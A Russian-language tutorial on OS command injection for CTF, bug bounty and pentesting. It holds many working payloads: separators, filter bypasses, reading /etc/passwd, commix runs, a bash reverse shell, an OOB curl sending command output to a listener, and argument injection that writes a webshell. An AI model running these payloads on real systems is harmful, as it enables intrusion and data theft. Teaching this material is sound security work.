Инъекция команд ОС (command injection) — это внедрение shell-команд через ввод, который попадает в вызов системной команды без экранирования. Классика: приложение делает `system("ping -c 1 " + $ip)`, и вместо IP вводят `127.0.0.1; id`. Если вывод команды возвращается в ответ — это straight (in-band) RCE; если нет — blind, и тогда используют задержку или OOB. Command injection — прямой путь к полному контролю над сервером, поэтому её ищут в каждом параметре, который похож на «системный» (IP, домен, имя файла, путь).

## Теория: как возникает и разделители

Причина — передача пользовательского ввода в shell (`system`, `exec`, `popen`, `os.system`, `Runtime.exec` с `sh -c`, `child_process.exec`). Shell интерпретирует **метасимволы**, и они позволяют разорвать «одну команду» на несколько:

| Разделитель | Поведение |
|-------------|-----------|
| `;` | последовательно |
| `\|` | pipe (вывод в следующую) |
| `\|\|` | выполнить вторую, если первая упала |
| `&&` | выполнить вторую, если первая успешна |
| `&` | фоновая / вторая команда |
| `$(...)` | подстановка вывода команды |
| `` `...` `` | то же (backticks) |
| `\n` (`%0a`) | новая строка = новая команда |
| `>` `<` | перенаправление |

Символ, который **не** разделяет команды, — например, `.` (точка) или `$` сам по себе: точка — часть имени файла, а `$` — начало переменной, но не разделитель. Именно поэтому в тестах важно отличать «метасимвол shell» от «обычного символа».

## Blind command injection: time и OOB

Когда вывода нет, работают два подхода:

**Time-based** — вызываем задержку и меряем время:

```bash
# если команда исполнилась -> задержка 5 секунд
curl -s -o /dev/null -w '%{time_total}\n' 'https://t/?ip=127.0.0.1;sleep 5'
# Windows
curl -s -o /dev/null -w '%{time_total}\n' 'https://t/?ip=127.0.0.1;ping -n 5 127.0.0.1'
```

**OOB** — заставляем сервер сделать внешний запрос к нашему листенеру:

```bash
# Linux
curl -s 'https://t/?ip=127.0.0.1;curl http://UNIQUE.oob.example/'
# через DNS
curl -s 'https://t/?ip=127.0.0.1;nslookup UNIQUE.oob.example'
```

OOB надёжнее: он не зависит от точности тайминга и подтверждает, что команда реально выполнилась.

## Обход фильтров: пробелы, слеши, кавычки

**Пробел заблокирован** → заменяем:

```bash
# ${IFS} — разделитель полей
127.0.0.1;cat${IFS}/etc/passwd
# $IFS$9
127.0.0.1;cat$IFS$9/etc/passwd
# табуляция/новая строка
127.0.0.1;cat%09/etc/passwd
127.0.0.1;cat%0a/etc/passwd
# фигурные скобки
127.0.0.1;{cat,/etc/passwd}
```

**Слеш заблокирован** → `${PATH:0:1}` даёт `/`, или используем `$(pwd)`:

```bash
127.0.0.1;cat${PATH:0:1}etc${PATH:0:1}passwd
```

**Одинарные кавычки**: чтобы вырваться из контекста `'...'`, закрываем кавычку, добавляем команду, открываем заново:

```bash
' ; id ; '
```

**Слова `cat`/`id` фильтруются** → `c\at`, `c'a't`, `/bin/c?t`, переменные.

**`$(cmd)`** — это подстановка: результат команды подставляется в строку. `$(id)` заменится на `uid=...`, что удобно для blind-эксфильтрации через URL.

## Инструменты: commix

**commix** — автоматизированный эксплуататор command injection (аналог sqlmap):

```bash
# базовый прогон
commix -u 'https://t/?ip=127.0.0.1'
# POST с данными и cookie
commix -u 'https://t/ping' --data='ip=127.0.0.1' --cookie='sess=...'
# указать параметр
commix -u 'https://t/?ip=1' -p ip
# OOB-режим
commix -u 'https://t/?ip=1' --dns-server=UNIQUE.oob.example
```

Дополнительно: **Burp Repeater** для ручных payload, **Collaborator** для OOB, **`time`/`curl -w`** для time-based.

## Разобранный пример: RCE через инъекцию в ping-утилите

Дано: форма принимает IP и «пингует» его.

```bash
# 1. нормальное поведение
curl -s 'https://t/ping?ip=127.0.0.1'
#   PING 127.0.0.1 ... 64 bytes ...
# 2. пробуем разделитель
curl -s 'https://t/ping?ip=127.0.0.1;id'
#   PING ... 
#   uid=33(www-data) gid=33(www-data) groups=33(www-data)   <- RCE!
# 3. читаем файл
curl -s 'https://t/ping?ip=127.0.0.1;cat /etc/passwd'
# 4. устойчивый канал
curl -s 'https://t/ping?ip=127.0.0.1;bash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"'
```

Артефакт — вывод `id` в ответе. Это подтверждённый RCE.

## Разобранный пример: blind через sleep и OOB

Дано: ответ всегда одинаковый.

```bash
# 1. time-based: задержка доказывает выполнение
time curl -s 'https://t/ping?ip=127.0.0.1;sleep 5'
# real 0m5.1s  -> команда выполнилась
# 2. OOB: эксфильтрация вывода в наш листенер
curl -s 'https://t/ping?ip=127.0.0.1;curl http://10.10.14.7:8000/$(id | base64 -w0)'
# в логах листенера видим base64 от `id`
```

OOB-вариант с подстановкой `$(...)` позволяет вытащить **вывод** команды, а не только факт выполнения.

## Разобранный пример: обход фильтра пробелов и слешей

```bash
# пробел и слеш заблокированы
curl -s 'https://t/ping?ip=127.0.0.1;cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd'
# фильтр по 'cat' и 'id'
curl -s 'https://t/ping?ip=127.0.0.1;/bin/c?a?${IFS}${PATH:0:1}etc${PATH:0:1}passwd'
```

`${PATH:0:1}` = первый символ `$PATH`, то есть `/`. `?` — wildcard для одного символа. Так обходят наивные чёрные списки.

## Взаимодействие с другими инъекциями

- **SSTI** — если ввод идёт в шаблонизатор, а не в shell (`web-ssti-*`).
- **SQLi → `xp_cmdshell`/`COPY TO PROGRAM`** — RCE через СУБД (`svc-database`).
- **Deser RCE** — другой путь к `system` (`web-php-deser-chains`).
- **SSRF → gopher** — RCE без прямой инъекции (`web-ssrf-protocol-smuggling`).

Практика: если параметр похож на «системный», проверяйте command injection первым; если он идёт в шаблон — SSTI; если в БД — SQLi.

## Типичные ошибки новичков

- **Сдаваться при отсутствии вывода.** Blind — норма, нужны time/OOB.
- **Не различать разделители.** `;`, `|`, `&&`, `$()` ведут себя по-разному.
- **Забыть про Windows.** `sleep` → `ping -n`, `id` → `whoami`, `cat` → `type`.
- **Игнорировать экранирование.** Контекст кавычек определяет payload.
- **Считать «фильтр пробела» тупиком.** `${IFS}` решает.
- **Ломать прод.** RCE — только с согласия.

## Что делать дальше / решение

1. Найдите параметр, уходящий в shell (IP/домен/имя/путь).
2. Подайте разделители (`;`, `|`, `$()`) и команду-маркер (`id`).
3. Нет вывода → time-based (`sleep`) и OOB (`curl`/`nslookup`).
4. Фильтры → `${IFS}`, `${PATH:0:1}`, кавычки, wildcards.
5. Автоматизируйте `commix`.
6. Доведите до устойчивого канала (reverse shell) + read-back.
7. Тупик → SSTI/SQLi/deser как соседние RCE-пути.

## Разобранный пример: argument injection (без shell)

Иногда приложение не использует shell, а вызывает программу напрямую с пользовательским аргументом: `execve("/bin/tar", ["tar","-xf",USER])`. Shell-метасимволы тут не работают, но можно **подсунуть опции** — это argument injection:

```bash
# tar с опцией --checkpoint-action=exec
curl -s 'https://t/backup?file=--checkpoint=1 --checkpoint-action=exec=sh shell.sh'
# curl с -o (записать файл)
curl -s 'https://t/fetch?url=--output=/var/www/html/shell.php'
# git с -c core.sshCommand
```

Признак: ввод начинается с `-`/`--` и влияет на поведение утилиты. Ищите параметры, передаваемые в `tar`, `curl`, `wget`, `git`, `ffmpeg`, `find`, `awk`. Это отдельный, часто пропускаемый класс.

## Разобранный пример: инъекция через eval/шаблон

Если команда собирается в строку и передаётся в `eval`/`bash -c`, любой метасимвол сработает:

```bash
# приложение: os.system(f"echo {name}")
curl -s 'https://t/hello?name=hi;id'
# приложение: subprocess.check_output(f"ls {path}", shell=True)
curl -s 'https://t/list?path=/tmp;id'
```

Отличие от argument injection: здесь есть shell, поэтому работают `;`, `|`, `$()`.

## Обнаружение: где искать инъекции команд

- **Параметры, похожие на системные**: `ip`, `host`, `domain`, `ping`, `traceroute`, `nslookup`.
- **Имена файлов/пути**: `file`, `path`, `dir`, `name`, `filename`, `template`.
- **Конвертация**: `convert`, `ffmpeg`, `resize`, `thumbnail`, `pdf`.
- **Бэкапы/архивы**: `tar`, `zip`, `backup`, `export`.
- **Email/логи**: `mail`, `sendmail`, `logger` (инъекция в заголовки/логи).
- **Исходники**: `grep -rn "system\|exec\|popen\|subprocess\|child_process"`.

Быстрая проверка на «системность»: подайте `;sleep 5` и измерьте время. Если отклик вырос — shell есть.

## Взаимодействие и эскалация

Command injection почти всегда даёт немедленный RCE, поэтому не тратьте время на «а есть ли ещё что-то»: сразу переходите к устойчивому каналу. Схема:

1. Подтвердите выполнение (`; id` или `; sleep 5`).
2. Получите вывод (in-band) или эксфильтрируйте (OOB `$(cmd)`).
3. Стабилизируйте: reverse shell (`bash -i >& /dev/tcp/...`) или запишите SSH-ключ/webshell.
4. Проведите **read-back** — подтвердите, что вы действительно исполняете команды от нужного пользователя.
5. Отметьте host как compromised и переходите к внутренним сервисам/эскалации привилегий.

## Итог

Command injection — прямой путь к RCE, и её надо проверять в каждом «системном» параметре. Методология: найдите кандидата → подайте разделитель и маркер → при отсутствии вывода используйте time/OOB → обходите фильтры (`${IFS}`, `${PATH:0:1}`, кавычки, wildcards) → автоматизируйте `commix` → доведите до устойчивого канала. Отдельно держите в голове **argument injection**: когда shell нет, но можно подсунуть опции утилите (`tar`, `curl`, `git`). И никогда не забывайте про read-back — «команда отправлена» не равно «команда выполнена».
## Быстрый чек-лист по command injection

1. Найдите «системный» параметр (ip/host/path/file/convert).
2. Подайте `;id` — если вывод вернулся, это RCE.
3. Нет вывода → `;sleep 5` и замер времени.
4. OOB → `;curl http://oob/$(id)` (в логе увидите вывод).
5. Фильтр пробела → `${IFS}`, `%09`, `%0a`.
6. Фильтр слеша → `${PATH:0:1}`.
7. Фильтр слов → `c\at`, `/bin/c?t`.
8. Windows → `;whoami`, `;ping -n 5 127.0.0.1`.
9. Автоматизация → `commix -u URL --data='ip=1'`.
10. Доведите до reverse shell + read-back.

## Где пригодится

- **CTF (Web):** command injection = мгновенный RCE и чтение флага с файловой системы; частый финальный шаг задачи.
- **Bug bounty:** RCE через command injection — critical (P1); демонстрация через `id`/`sleep` достаточна для отчёта.
- **Пентест:** получение foothold на сервере — ключевой этап; command injection — прямой путь к нему.
- **Работа (AppSec):** запрет `shell=True`, использование списков аргументов, whitelisting — базовые меры, которые проверяет безопасник.
